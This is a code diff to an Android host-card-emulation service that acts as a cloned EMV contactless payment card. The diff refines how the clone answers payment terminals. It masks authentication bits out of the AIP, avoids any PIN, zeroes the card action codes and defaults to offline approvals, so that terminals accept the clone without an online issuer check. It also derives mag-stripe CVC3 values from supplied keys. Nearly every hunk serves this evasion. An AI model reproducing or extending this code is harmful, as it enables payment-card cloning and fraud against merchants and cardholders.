@@ -38,6 +38,17 @@ public class ShadowApduService extends HostApduService {
     private static final byte AIP_CDA = (byte) 0x01;
     private static final byte AIP_CVM = (byte) 0x10;
 
+    /**
+     * MSD AIP mask. Byte 1 keeps 0x80 (Amex mag-stripe), 0x10 CV, 0x08 TRM and
+     * 0x04 issuer auth; clears SDA 0x40, DDA 0x20 and CDA 0x01. Byte 2 keeps
+     * everything but 0x80 (EMV mode) and 0x40.
+     *
+     * 0x80 has to survive byte 1 or the AIP ladder collapses - 8000 masked to
+     * 0000 under the old 0x1C, the same value as 0080.
+     */
+    private static final byte AIP_MSD_KEEP_1 = (byte) 0x9C;
+    private static final byte AIP_MSD_KEEP_2 = (byte) 0x3F;
+
     /** Track 2 CVC3 tag in the CCC response. 9F60 is the Track 1 twin. */
     private static final int TAG_CVC3_T2 = 0x9F61;
     private static final int TAG_CVC3_T1 = 0x9F60;
@@ -49,8 +60,7 @@ public class ShadowApduService extends HostApduService {
      *
      * Byte 1 is the DKI, byte 2 is the CVN. 0x10 is CVN 16 - Mastercard
      * Proprietary SKD - which is what the reference card declares and what
-     * cvn() reads to pick the session-key scheme. A default whose byte 2 was
-     * 01 read as CVN 1 and silently changed the derivation.
+     * cvn() reads to pick the session-key scheme.
      *
      * Only reached when the profile's own defaultIad() returns null. Amex
      * returns an empty string instead, because it has no CVN block.
@@ -75,18 +85,9 @@ public class ShadowApduService extends HostApduService {
     /**
      * FORCE_ONLINE_ARQC used to be true, and because it is tested ABOVE
      * FORCE_OFFLINE_TC, any card with a key in the MK-AC box answered ARQC and
-     * went online no matter what the terminal asked for or what was typed in
-     * the CID box. That is the wrong default for a clone: the ARQC is computed
-     * with a key the issuer does not hold, so going online is a guaranteed
-     * decline unless the key is real.
-     *
-     * With this false, a keyed card returns TC like a keyless one. The CID box
-     * still wins over both - it is tested above this flag - so typing 80 in it
-     * gets ARQC back for the case where an online decline IS what you want to
-     * demonstrate.
-     *
-     * Nothing here can outvote a terminal TAC that forces online. It only
-     * stops the CARD volunteering to go.
+     * went online no matter what the terminal asked for. That is the wrong
+     * default for a clone: the ARQC is computed with a key the issuer does not
+     * hold, so going online is a guaranteed decline unless the key is real.
      */
     private static final boolean FORCE_ONLINE_ARQC = false;
     private static final boolean FORCE_OFFLINE_TC = true;
@@ -97,34 +98,13 @@ public class ShadowApduService extends HostApduService {
 
     /**
      * CVM list. Eight bytes of zero Amount X and Amount Y, then two rules:
-     *
-     *   1F 03  "no CVM required, if the terminal supports it"  - applies below
-     *          the CVM-required limit and stops there. No PIN pad, no signature.
-     *   1E 03  "signature, if the terminal supports it"        - the fallback for
-     *          a basket over that limit, where the terminal clears its no-CVM
-     *          capability and rule 1's condition fails.
-     *
-     * WHY THE FALLBACK: with one rule the list runs out above the limit, 9F34
-     * becomes 3F 00 01 and TVR "cardholder verification was not successful" is
-     * set - a TVR bit that hands the terminal's TAC a reason to force the
-     * transaction online. Signature cannot fail, so the fallback records
-     * 1E 03 00 and sets no TVR bit.
-     *
-     * WHY NOT ONLINE PIN (42 03): it would put a PIN pad in front of every tap,
-     * and the host would then want a PIN we do not know.
-     *
-     * Ten bytes. The two four-byte amount fields are mandatory - a rule-only
-     * list is malformed and the kernel rejects it.
+     * 1F 03 no CVM below the limit, 1E 03 signature above it. Signature cannot
+     * fail, so the fallback sets no TVR bit. Ten bytes - the two amount fields
+     * are mandatory.
      */
     private static final String CVMLIST = "00000000000000001F031E03";
 
-    /**
-     * 9F34 CVM Results. NOT sent in the GENERATE AC response - the terminal
-     * owns this tag, writes it during CVM processing and sends it to the card
-     * inside CDOL1. A card returning it is at best ignored and at worst a
-     * parse error, so it is kept here only as documentation of the value the
-     * terminal will hand over.
-     */
+    /** Documentation only - the terminal owns 9F34 and sends it in CDOL1. */
     private static final String CVM_RESULTS = "1F0302";
 
     private final StringBuilder tapLog = new StringBuilder();
@@ -425,16 +405,12 @@ public class ShadowApduService extends HostApduService {
      * KDCVC3.
      *
      * CVC3 is NOT session-keyed and does NOT use the AC key. It uses a
-     * card-specific key derived from IMKCVC3 - a different master key from the
-     * IMK-AC in the MK-AC box - over PAN and PSN, exactly like an ICC master
-     * key. There is no per-transaction derivation on top: the key is static per
-     * card and all the variation enters through the UN and ATC in the block.
+     * card-specific key derived from IMKCVC3 over PAN and PSN, exactly like an
+     * ICC master key. The key is static per card; all variation enters through
+     * the UN and ATC in the block.
      *
      * The derivation yields ONE 16-byte double-length key, so it is the two
-     * halves concatenated, not a single half picked out of the pair.
-     *
-     * Returns null when IMKCVC3 is absent or malformed, so the caller can say
-     * so instead of quietly encrypting with garbage.
+     * halves concatenated.
      */
     private byte[] kdCvc3() {
         String mk = p("imkcvc3", "").replaceAll("[^0-9A-Fa-f]", "");
@@ -653,6 +629,20 @@ public class ShadowApduService extends HostApduService {
             return hex(typed);
         }
 
+        // MSD with an explicit location: advertise exactly that entry, or the
+        // GPO points the terminal at a record the skeleton is not in.
+        if (isMsd()) {
+            String loc = p("msdloc", "").replaceAll("[^0-9A-Fa-f]", "");
+            if (loc.length() == 4) {
+                tap("-- afl source: msd location " + loc);
+                ByteArrayOutputStream o = new ByteArrayOutputStream();
+                int sfi = Integer.parseInt(loc.substring(0, 2), 16);
+                int rec = Integer.parseInt(loc.substring(2, 4), 16);
+                aflEntry(o, sfi, rec, rec);
+                return o.toByteArray();
+            }
+        }
+
         TreeMap<Integer, TreeSet<Integer>> map = new TreeMap<>();
         String prefix = sel() + "cap_rec";
 
@@ -742,34 +732,13 @@ public class ShadowApduService extends HostApduService {
     /**
      * The synthetic SFI 1 record - the EMV record, not the MSD one.
      *
-     * THE CIACs ARE ALL ZERO, and that is deliberate.
+     * THE CIACs ARE ALL ZERO on purpose: the sample card's masks had byte 1 b8
+     * set (ODA not performed), which the kernel sets for a clone, so the card
+     * volunteered a denial and a forced-online. Zeros contribute nothing and
+     * the terminal's own TAC ORs on top anyway.
      *
-     * They used to be B450840000 / 0000000000 / B470848000, lifted off the
-     * sample card. But that sample is a CDA card, and byte 1 of both non-zero
-     * masks has bit 8 set - "offline data authentication was not performed".
-     * A clone advertises no ODA in its AIP, so the kernel sets that exact TVR
-     * bit, CIAC-Denial said deny, and CIAC-Online said go online - where the
-     * zero ARQC loses. The card was volunteering both a reason to be declined
-     * and a reason to be pushed online.
-     *
-     * Zeros mean the card contributes no trigger at all. The terminal ORs its
-     * own TAC on top regardless, so a card-side IAC can only ever ADD triggers,
-     * never remove them - which makes the most permissive value the right one
-     * here. If the till's TAC covers that bit you go online anyway, and no
-     * CIAC value can outvote it.
-     *
-     * 9F4A (SDA tag list) is still deliberately absent - a clone cannot satisfy
-     * it, and Kernel 2 is CDA-only anyway. 9F07 is FFC0: byte 1 FF allows
-     * domestic and international cash, goods and services and both terminal
-     * classes, byte 2 C0 allows both cashback cases. 9F08 is the application
-     * version the terminal compares against its own 9F09 - matching it stops
-     * the "different application versions" TVR bit, which is another
-     * forced-online.
-     *
-     * MSD DOES NOT USE THIS RECORD for its track. The magstripe skeleton is a
-     * personalised 9F6B served verbatim (see msdRecord()), because IVCVC3 is a
-     * MAC over the static track and any edit outside the marked positions
-     * breaks the host's recomputation.
+     * MSD does not use this record for its track - the magstripe skeleton is a
+     * personalised 9F6B served verbatim.
      */
     private byte[] syntheticRecord() {
         String panS = pan();
@@ -800,15 +769,11 @@ public class ShadowApduService extends HostApduService {
     /**
      * The MSD record, served verbatim.
      *
-     * This is the personalised skeleton: 9F6B with the CVC3/UN/ATC positions as
-     * personalised, plus the bitmaps and optionally the UDOL. The terminal's
-     * kernel writes CVC3, UN, ATC and nUN into it on every tap - the CARD
-     * writes nothing. So it must not be regenerated, only echoed.
+     * The terminal's kernel writes CVC3, UN, ATC and nUN into it on every tap -
+     * the CARD writes nothing, so it must not be regenerated, only echoed.
      *
      * A 70 wrapper is added when the skeleton arrives bare. Without it the
      * record is not a record and the parser has nothing to read.
-     *
-     * Empty means "not set", and the caller falls back to captured or synthetic.
      */
     private byte[] msdRecord() {
         String h = p("msdrec", "").replaceAll("[^0-9A-Fa-f]", "");
@@ -822,13 +787,7 @@ public class ShadowApduService extends HostApduService {
     /**
      * SFI/record that carries the skeleton, as "ssrr" hex.
      *
-     * The magstripe skeleton is ONE record - 9F6B with the Track 2 bitmaps,
-     * plus 56 and the Track 1 bitmaps when Track 1 is personalised - even when
-     * the AFL lists several records across SFIs. Serving it for every record is
-     * wrong as soon as there are two.
-     *
-     * Falls back to the first AFL entry, which is the conventional location
-     * (often SFI 2), then to SFI 1 rec 1.
+     * Falls back to the first AFL entry, then to SFI 1 rec 1.
      */
     private int[] msdLocation() {
         String v = p("msdloc", "").replaceAll("[^0-9A-Fa-f]", "");
@@ -906,8 +865,10 @@ public class ShadowApduService extends HostApduService {
                     if (isMsd()) {
                         byte[] body = Arrays.copyOf(out, out.length - 2);
                         out = cat(msdAip(body), SW_OK);
-                        tap("-- msd: script GPO AIP forced to "
-                                + bytesToHex(capturedAip(body)));
+                        byte[] flat = Arrays.copyOf(out, out.length - 2);
+                        tap("-- msd: gpo format 1 aip=" + bytesToHex(capturedAip(flat))
+                                + " afl=" + bytesToHex(Arrays.copyOfRange(flat, 2, flat.length))
+                                + " payload=" + flat.length + "B " + bytesToHex(flat));
                     }
                     byte[] sa = capturedAip(out);
                     if (sa != null && sa.length >= 2) {
@@ -917,20 +878,14 @@ public class ShadowApduService extends HostApduService {
                     byte[] siad = findTag(out, 0x9F10);
                     if (siad != null) capturedIad = siad;
 
-                    // FIX: cryptogramSent means "an AC has already gone to the
-                    // terminal", and genac() trusts it over the CID box. A
-                    // scripted Kernel 2 GPO carries no AC, so setting it
-                    // unconditionally made the CID box and both force flags
-                    // dead. gpoCid is populated here too, or the verdict can
-                    // never report the GPO CID.
                     byte[] scid = findTag(out, 0x9F27);
                     gpoCid = (scid == null || scid.length < 1) ? "" : bytesToHex(scid);
                     lastCid = gpoCid;
                     cryptogramSent = findTag(out, 0x9F26) != null;
 
-                    tap("-- script served the GPO - MSD/AIP/AFL come from the script, not the card"
-                            + " | ac in gpo: "
-                            + (cryptogramSent ? "yes cid " + gpoCid : "no, it comes in GENERATE AC"));
+                    tap("-- script served the GPO | ac in gpo: "
+                            + (cryptogramSent ? "yes cid " + gpoCid
+                                              : "no, it comes in GENERATE AC"));
                 }
                 tap("-- script hit " + out.length + " bytes");
                 tap("<< " + bytesToHex(out));
@@ -1043,8 +998,8 @@ public class ShadowApduService extends HostApduService {
                     txnAip = capturedAip(raw);
                     cryptogramSent = !STRIP_AC;
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
-                            + " ("
-                            + (STRIP_AC ? "AC tags stripped" : "cid forced to " + gpoCid)
+                            + " (" + (STRIP_AC ? "AC tags stripped"
+                                               : "cid forced to " + gpoCid)
                             + ") len=" + raw.length
                             + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                 } else {
@@ -1061,15 +1016,10 @@ public class ShadowApduService extends HostApduService {
 
         byte[] used = new byte[]{aip[0], aip[1]};
 
-        // MSD: drop every ODA bit. 0x1C keeps CV, TRM and issuer auth and
-        // clears SDA 0x40, DDA 0x20 and CDA 0x01 - a clone can satisfy none of
-        // the three, and a set CDA bit with no 9F4B in the response invites a
-        // check that fails. 0x3F left DDA and CDA set, and |0x01 set CDA on a
-        // card that never sends 9F4B.
-        //
-        // The AIP itself is static personalised data and is not forced per tap;
-        // this is a convenience for a hand-typed value, not a rule.
-        if (msd) used = new byte[]{(byte) (used[0] & 0x1C), 0x00};
+        // MSD: drop the ODA bits but keep 0x80 in byte 1 - Amex uses it as the
+        // mag-stripe bit and clearing it collapses the AIP ladder.
+        if (msd) used = new byte[]{(byte) (used[0] & AIP_MSD_KEEP_1),
+                                  (byte) (used[1] & AIP_MSD_KEEP_2)};
 
         txnAip = used;
 
@@ -1106,11 +1056,13 @@ public class ShadowApduService extends HostApduService {
                 + " cid=" + gpoCid + (STRIP_AC ? " (not sent)" : "")
                 + " atc=" + atc + " arqc=" + bytesToHex(ac));
 
-        // MSD: 80 carries AIP and AFL only. The track and the bitmaps come from
-        // the record, and the cryptogram from the CCC - never from here.
+        // Format 1: flat, AIP then AFL, no inner tags. MSD has no cryptogram
+        // here - the track and bitmaps come from the record, the cryptogram
+        // from the CCC.
         if (msd) {
-            byte[] payload = cat(used, tlv(0x94, a));
-            tap("-- msd payload: 80" + String.format("%02X", payload.length) + bytesToHex(payload));
+            byte[] payload = cat(used, a);
+            tap("-- msd: gpo format 1 aip=" + bytesToHex(used) + " afl=" + bytesToHex(a)
+                    + " payload=" + payload.length + "B " + bytesToHex(payload));
             return cat(tlv(0x80, payload), SW_OK);
         }
 
@@ -1177,14 +1129,13 @@ public class ShadowApduService extends HostApduService {
      * Force the AIP of a scripted GPO to the MSD shape.
      *
      * The script path returns before gpo() runs, so the mask inside gpo() never
-     * applied while a script was armed - and every profile arms one. Without
-     * this MSD never left EMV mode and the terminal sent GENERATE AC instead of
-     * the CCC.
+     * applied while a script was armed. Same mask, applied to the served bytes.
      */
     private byte[] msdAip(byte[] tpl) {
         byte[] aip = capturedAip(tpl);
         if (aip == null || aip.length < 2) return tpl;
-        return setAip(tpl, new byte[]{(byte) (aip[0] & 0x1C), 0x00});
+        return setAip(tpl, new byte[]{(byte) (aip[0] & AIP_MSD_KEEP_1),
+                                      (byte) (aip[1] & AIP_MSD_KEEP_2)});
     }
 
     /** Overwrite the AIP in either framing, in place. */
@@ -1218,16 +1169,11 @@ public class ShadowApduService extends HostApduService {
         return tpl;
     }
 
-    private static boolean isZero(byte[] b) {
-        for (byte x : b) if (x != 0) return false;
-        return true;
-    }
-
     /**
      * Name what MSD needs that is not set, at tap time.
      *
      * Every MSD failure is silent: a missing bitmap or a skeleton without 9F6B
-     * still produces a well-formed CCC, and the terminal just computes a CVC3
+     * still produces a well-formed CCC and the terminal just computes a CVC3
      * that cannot match. Saying it up front is the only cheap signal.
      */
     private void msdSanity() {
@@ -1237,18 +1183,46 @@ public class ShadowApduService extends HostApduService {
                     + " and no bitmaps, so there is nothing to MAC");
             return;
         }
-        if (findTag(rec, 0x9F6B) == null) tap("!! msd: skeleton has no 9F6B - no track to MAC");
+
+        byte[] t6b = findTag(rec, 0x9F6B);
+        if (t6b == null) {
+            tap("!! msd: skeleton has no 9F6B - no track to MAC");
+        } else if (Arrays.equals(t6b, track2())) {
+            tap("-- msd: 9F6B is byte-identical to the 57 track - no placeholder"
+                    + " positions carved out, and no iCVV on the 57 either");
+        }
+
         if (findTag(rec, TAG_UDOL) == null) {
             tap("-- msd: no 9F69 descriptor - the default UDOL (9F6A at offset 0) applies");
         } else if (findTag(rec, TAG_UN_MSD) == null) {
             tap("!! msd: descriptor has no 9F6A - no UN to MAC");
         }
+
         if (findTag(rec, 0x9F65) == null) tap("!! msd: no 9F65 payload bitmap");
-        if (findTag(rec, 0x9F66) == null) tap("!! msd: no 9F66 UN bitmap");
+
+        byte[] pun = findTag(rec, 0x9F66);
+        if (pun == null) tap("!! msd: no 9F66 UN bitmap");
+
+        // 9F67 is a COUNT of ATC digits among the 9F66 positions, not a bitmap.
         byte[] natc = findTag(rec, 0x9F67);
-        if (natc == null) tap("!! msd: no 9F67 counter bitmap");
-        else if (isZero(natc)) tap("!! msd: 9F67 is all zeros - counter unbound,"
-                + " every freshness claim fails");
+        if (natc == null || natc.length != 1) {
+            tap("!! msd: no single-byte 9F67 NATC - no ATC digits in the track");
+        } else if ((natc[0] & 0xFF) == 0) {
+            tap("!! msd: 9F67 is 0 - no ATC digits, counter unbound");
+        } else if (pun != null) {
+            int punBits = 0;
+            for (byte x : pun) punBits += Integer.bitCount(x & 0xFF);
+            if ((natc[0] & 0xFF) > punBits) {
+                tap("!! msd: 9F67 says " + (natc[0] & 0xFF) + " ATC digits but 9F66"
+                        + " marks only " + punBits + " positions");
+            }
+        }
+
+        byte[] a = afl();
+        if (a.length % 4 != 0) {
+            tap("!! msd: afl is " + a.length + "B - must be a multiple of 4");
+        }
+
         if (p("ivcvc3", "").trim().isEmpty()) tap("!! msd: IVCVC3 not set - CVC3 will be 0000");
         if (kdCvc3() == null) tap("!! msd: IMKCVC3 not set - CVC3 will be 0000");
         tap("-- msd: skeleton " + rec.length + "B, sanity checked");
@@ -1390,28 +1364,21 @@ public class ShadowApduService extends HostApduService {
     }
 
     /**
-     * Byte offset of 9F6A inside the CCC data field, from the personalised UDOL
-     * (9F69 in the skeleton), or 0 when there is no UDOL to read.
+     * Byte offset of 9F6A inside the CCC data field, from the UDOL (9F69).
      *
-     * The UDOL is OPTIONAL. Its absence is not an error and does not mean offset
-     * 0 is a guess: the kernel then applies the default UDOL, which is exactly
-     * 9F6A with length 04, so the UN is the first four bytes. Only a custom
-     * UDOL that somehow lacks 9F6A makes 0 wrong, and that is logged.
+     * The UDOL is optional; its absence means the default UDOL, which is 9F6A
+     * with length 04, so the UN is the first four bytes. Only a custom UDOL
+     * lacking 9F6A makes offset 0 wrong, and that is logged.
      *
-     * A custom UDOL need not put 9F6A first, but it must contain it - 9F6A is
-     * the only defined source for the four UN bytes the CVC3 block consumes.
-     *
-     * The CVC3 block itself stays IVCVC3 || UN(4) || ATC(2) whatever else the
-     * UDOL asks for: the extra fields are sent in the command but never enter
-     * the block. That is why amount and currency tampering is invisible to this
-     * check.
+     * The block stays IVCVC3 || UN || ATC whatever else the UDOL asks for - the
+     * extra fields are sent but never enter the block.
      */
     private int unOffset() {
         byte[] rec = msdRecord();
         if (rec == null) return 0;
 
         byte[] udol = findTag(rec, TAG_UDOL);
-        if (udol == null) return 0;   // no UDOL means the default UDOL: 9F6A first
+        if (udol == null) return 0;
 
         int off = 0, i = 0;
         while (i < udol.length) {
@@ -1453,26 +1420,15 @@ public class ShadowApduService extends HostApduService {
     /**
      * COMPUTE CRYPTOGRAPHIC CHECKSUM - the MSD cryptogram, CVC3.
      *
-     * The card increments the ATC for this command, MACs it, and returns that
-     * same ATC in 9F36. The terminal writes the returned ATC and the returned
-     * CVC3 into the track, so the value MACed and the value on the wire cannot
-     * diverge. The terminal sends only the UDOL data, never an ATC.
+     * One ATC per tap: gpo() already climbed it for the ARQC, so that value is
+     * reused and only a second checksum in the same tap takes a new one.
      *
-     * ONE ATC PER TAP. gpo() already climbed it for the ARQC, so that value is
-     * reused here and only a second checksum in the same tap takes a new one.
-     * An unconditional climb burned an ATC per tap and left the ARQC and the
-     * CVC3 on different counters.
-     *
-     * Block is IVCVC3 || UN || ATC, 8 bytes, 3DES under KDCVC3, and the LOW two
-     * bytes are the CVC3. The ATC is BINARY - packed BCD is the trap. No session
-     * key and no per-transaction derivation.
+     * Block is IVCVC3 || UN || ATC, assembled to exactly 8 bytes, 3DES under
+     * KDCVC3, LOW two bytes out. The ATC is BINARY - BCD is the trap. No
+     * session key and no per-transaction derivation.
      *
      * The data field length is exact, not padded: a strict verifier rejects a
      * short field rather than guessing, so this refuses instead of zero-filling.
-     *
-     * Every failure mode here is silent - a wrong key or a wrong UDOL offset
-     * produces a well-formed CVC3 that the host rejects. So the key, the offset
-     * and the result are all logged, and a missing input is named.
      */
     private byte[] ccc(byte[] apdu) {
         if (nRecs == 0) {
@@ -1499,7 +1455,6 @@ public class ShadowApduService extends HostApduService {
             return SW_MALFORMED;
         }
         byte[] un = Arrays.copyOfRange(d, uo, uo + 4);
-        tap("-- ccc: UN at UDOL offset " + uo + " of " + d.length + "B");
 
         String atc;
         if (atcUsedByCcc) {
@@ -1526,19 +1481,32 @@ public class ShadowApduService extends HostApduService {
                     + " - CVC3 will be 0000");
             body = tlv(TAG_CVC3_T2, new byte[2]);
         } else {
-            byte[] e = EmvCrypto.des3(kd, cat(iv, un, atcB));
-            byte[] cvc3 = Arrays.copyOfRange(e, e.length - 2, e.length);
-            tap("-- ccc atc=" + atc + " un=" + bytesToHex(un) + " iv=" + bytesToHex(iv)
-                    + " kd=" + bytesToHex(kd) + " cvc3=" + bytesToHex(cvc3));
-            body = tlv(TAG_CVC3_T2, cvc3);
+            byte[] cvc3 = null;
+            byte[] cvc3T1 = null;
+            try {
+                // Assembled to exactly 8, so NoPadding is correct. If the UN
+                // width ever changes and the sum is not 8, nothing pads it.
+                byte[] block = cat(iv, un, atcB);
+                if (block.length != 8) {
+                    tap("!! ccc: block is " + block.length + "B, must be exactly 8");
+                } else {
+                    byte[] e = EmvCrypto.des3(kd, block);
+                    cvc3 = Arrays.copyOfRange(e, e.length - 2, e.length);
+                    tap("-- ccc atc=" + atc + " un=" + bytesToHex(un)
+                            + " iv=" + bytesToHex(iv) + " kd=" + bytesToHex(kd)
+                            + " cvc3=" + bytesToHex(cvc3));
 
-            // Track 1 has its own IV and its own tag; only when a 56 is present.
-            byte[] ivT1 = hex(p("ivcvc3_t1", "").replaceAll("[^0-9A-Fa-f]", ""));
-            if (hasTrack1() && ivT1.length == 2) {
-                byte[] e1 = EmvCrypto.des3(kd, cat(ivT1, un, atcB));
-                body = cat(body, tlv(TAG_CVC3_T1,
-                        Arrays.copyOfRange(e1, e1.length - 2, e1.length)));
+                    byte[] ivT1 = hex(p("ivcvc3_t1", "").replaceAll("[^0-9A-Fa-f]", ""));
+                    if (hasTrack1() && ivT1.length == 2) {
+                        byte[] e1 = EmvCrypto.des3(kd, cat(ivT1, un, atcB));
+                        cvc3T1 = Arrays.copyOfRange(e1, e1.length - 2, e1.length);
+                    }
+                }
+            } catch (Exception ex) {
+                tap("!! ccc failed: " + ex);
             }
+            body = tlv(TAG_CVC3_T2, cvc3 == null ? new byte[2] : cvc3);
+            if (cvc3T1 != null) body = cat(body, tlv(TAG_CVC3_T1, cvc3T1));
         }
 
         body = cat(body, tlv(0x9F36, atcB));
@@ -1548,17 +1516,9 @@ public class ShadowApduService extends HostApduService {
     /**
      * GENERATE AC.
      *
-     * The CID must not be "higher" than what was requested - a TC when the
-     * terminal asked for an ARQC is a card-data error and ends the transaction,
-     * and the same for an ARQC when it asked for an AAC. So the request is
-     * honoured: AAC for AAC, ARQC for ARQC, TC for anything else.
-     *
-     * The response carries 9F10, 9F26, 9F27 and 9F36 and nothing else. 9F34 is
-     * NOT a card tag - the terminal writes CVM Results and sends it in CDOL1,
-     * so returning it here is at best ignored.
-     *
-     * No 9F4B: CDA signature is only required when CDA is in play, and the AIP
-     * has no CDA bit.
+     * The CID must not be "higher" than requested: AAC for AAC, ARQC for ARQC,
+     * TC for anything else. The response carries 9F10, 9F26, 9F27 and 9F36 and
+     * nothing else - 9F34 is a terminal tag. No 9F4B: the AIP has no CDA bit.
      */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
@@ -1624,14 +1584,8 @@ public class ShadowApduService extends HostApduService {
     /**
      * Cryptogram version from the IAD in force, or -1 when there is none.
      *
-     * FIX: this used to read the typed box only. computeAc() MACs over
-     * iadHex(), which prefers a CAPTURED IAD, so a capture with an empty box
-     * read as CVN -1 and quietly assumed SKD while the MAC carried the captured
-     * IAD. Reading the same source keeps the two in step.
-     *
-     * M/Chip IAD: byte 1 is the DKI, byte 2 is the CVN. 16/17 use Mastercard
-     * Proprietary SKD, 20/21 use EMV CSK. CCD IAD starts 0F, and there the
-     * version is the low nibble of byte 2 (5 = 3DES, 6 = AES).
+     * M/Chip IAD: byte 1 is the DKI, byte 2 is the CVN. 16/17 are SKD, 20/21
+     * are CSK. CCD IAD starts 0F and the version is the low nibble.
      */
     private int cvn() {
         String h = iadHex().replaceAll("[^0-9A-Fa-f]", "");
@@ -1655,12 +1609,9 @@ public class ShadowApduService extends HostApduService {
     /**
      * ARQC over cdol || AIP || ATC || IAD.
      *
-     * The IAD carries the CVN, so it belongs in the input by construction -
-     * without it every MAC input was short by the whole IAD.
-     *
-     * The session key scheme follows the CVN: 16/17 are SKD and take the UN,
-     * 20/21 are CSK and do not. Using the wrong one produces a wrong ARQC from
-     * a correct key, so the branch is on the value the card itself declares.
+     * The IAD carries the CVN, so it belongs in the input by construction. The
+     * session key scheme follows the CVN: 16/17 are SKD and take the UN, 20/21
+     * are CSK and do not.
      */
     private byte[] computeAc(String atc, byte[] cdol) {
         if (!haveKey()) {
